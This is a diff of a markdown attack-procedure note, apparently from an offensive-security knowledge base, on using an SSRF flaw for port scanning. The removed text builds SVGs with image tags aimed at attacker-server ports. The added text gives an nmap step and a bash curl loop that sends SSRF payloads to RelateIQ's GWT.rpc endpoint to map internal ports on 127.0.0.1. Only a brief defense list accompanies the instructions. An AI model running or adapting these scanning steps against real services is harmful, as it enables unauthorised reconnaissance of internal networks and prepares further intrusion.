@@ -1,28 +1,30 @@
 ---
+id: proc-relateiq-port-scan-ssrf
 tags:
   - ssrf
   - port-scanning
+  - nmap-reference
 type: procedure
-tools: []
+tools:
+  - '[[tools/nmap]]'
 tactics:
   - '[[Reconnaissance]]'
-commands: []
+commands:
+  - '[[commands/gwt-rpc-ssrf-test]]'
+verified: false
 platforms:
   - Web
-  - Linux
+submitted: true
+created_at: '2023-10-01T00:00:00Z'
 techniques:
   - '[[Active Scanning]]'
-skill_level: advanced
+updated_at: '2025-12-14T17:28:20.607Z'
+skill_level: intermediate
 impact_level: high
 detection_risk: high
 sub_techniques:
   - '[[Vulnerability Scanning]]'
-id: 25b9d6b7-2850-4113-807e-3f0b72235585
-created_at: '2025-12-14T03:46:14.360Z'
-updated_at: '2025-12-14T03:46:14.360Z'
-verified: false
 validated: true
-submitted: true
 mitre_tactics:
   - '[[Reconnaissance]]'
 mitre_techniques:
@@ -32,49 +34,60 @@ mitre_techniques:
 
 ## Summary
 
-Uses the SSRF to scan the target's outbound TCP ports by attempting connections to attacker-server on each port, revealing filtering (e.g., port 113 blocked).
+This procedure uses the SSRF vulnerability to scan ports on target systems by modifying the custom URL in repeated GWT RPC requests, leveraging response differences to infer port status.
 
 ## Description
 
-By embedding multiple <image> elements with port-specific URLs (e.g., http://attacker-server:port/test), the parser attempts fetches, generating SYN packets. This scans all 65535 ports, limited by outbound filters.
+Once SSRF is confirmed, attackers can target localhost or external/internal IPs with common ports (e.g., top 50 from nmap). Open ports cause timeouts or connection errors (HTTP 504), while closed ports return direct failure messages. This enables blind port scanning from the RelateIQ server perspective, revealing internal network details.
 
 ## Requirements
 
-1. Script to generate SVG with 65535 <image> tags (may need batching due to size)
-2. Attacker server listening on all ports (e.g., nc -l -p all)
-3. Tools to monitor TCP SYNs (tcpdump)
+1. Confirmed SSRF via prior test
+2. List of target ports/IPs (use nmap for common ports)
+3. Scripting capability for automation (e.g., bash loop with curl)
 
 ## Defense
 
 Defensive measures and detection strategies:
 
-- Firewall outbound connections from image processors to specific ports/protocols
-- Rate-limit external fetches per upload
-- Detect port sweeps in logs
+- Block outbound connections from application servers to internal IPs
+- Implement request rate limiting on validation endpoints
+- Anomaly detection on connection logs for port probing patterns
 
 ## Objectives
 
-1. Map outbound port accessibility
-2. Identify filtered ports like 113
-3. Gather network recon
+1. Probe multiple ports on localhost/external systems
+2. Differentiate open vs. closed ports via responses
+3. Gather reconnaissance data for further exploits
 
 ## Instructions
 
-### Step 1: Generate Port-Specific SVG
+### Step 1: Gather Target Ports
 
-**Context**: Create payload with port URLs.
+**Context**: Use nmap to reference common ports for scanning.
 
-Manually or script: <image xlink:href="http://attacker-server:1/test.png" /> ... up to :65535.
+**Command** (nmap top ports):
+```bash
+nmap --top-ports 50 -oN ports.txt 127.0.0.1
+```
 
-> Batch if SVG too large; upload multiple times.
+> Extract ports like 80, 22, 443 for testing.
 
-### Step 2: Upload and Monitor Connections
+### Step 2: Iterate Scanning Requests
 
-**Context**: Trigger and capture SYNs.
+**Context**: Modify and send RPC payloads for each port.
 
-Upload disguised SVG; use tcpdump on attacker: tcpdump -i any tcp portrange 1-65535.
+**Command** ([[commands/gwt-rpc-ssrf-test]] with port variation):
+```bash
+# Loop example for ports
+for port in $(cat ports.txt | grep '/' | cut -d'/' -f1); do
+  payload="...|https://127.0.0.1:$port|..."
+  curl -X POST https://app.relateiq.com/app/GWT.rpc -H "Content-Type: text/x-gwt-rpc; charset=utf-8" -d "$payload" | grep -i "504\|connect"
+  if [[ $? -eq 0 ]]; then echo "Open: $port"; fi
+ done
+```
 
-> Expect SYNs on all except 113.
+> Open ports show HTTP 504 or 'connection closed'; closed show 'Unable to connect'.
 
 ## MITRE ATT&CK Mapping
 
@@ -92,11 +105,14 @@ Upload disguised SVG; use tcpdump on attacker: tcpdump -i any tcp portrange 1-65
 
 ## Commands Used
 
+- [[commands/gwt-rpc-ssrf-test]]
 
 ## Tools Used
 
+- [[tools/nmap]]
 
 ## Tags
 
-- [[port-scan]]
-- [[ssrf]]
+- ssrf
+- port-scanning
+- reconnaissance
